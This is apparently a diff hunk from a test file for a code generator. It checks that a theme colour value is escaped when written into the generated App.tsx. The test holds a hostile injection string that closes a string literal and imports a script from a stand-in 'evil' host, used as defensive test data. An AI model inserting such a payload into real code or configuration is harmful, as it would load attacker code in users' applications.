@@ -67,7 +67,7 @@ describe('generateProject (widget + mock core)', () => {
     // become live source in the emitted App.tsx (e.g. closing the literal and
     // injecting a new statement/import).
     const hostile = "red'}; import('http://evil/x.js'); const y='";
-    const app = file(generateProject(construct({ theme: { accent: hostile } })), 'src/App.tsx');
+    const app = file(generateProject(construct({ theme: { accent: hostile, mode: 'system' } })), 'src/App.tsx');
     // The raw payload must never appear unescaped/unquoted in the source.
     expect(app).not.toContain(`'--kai-color-primary': '${hostile}'`);
     // It must appear only inside a properly JSON-escaped string literal — i.e.
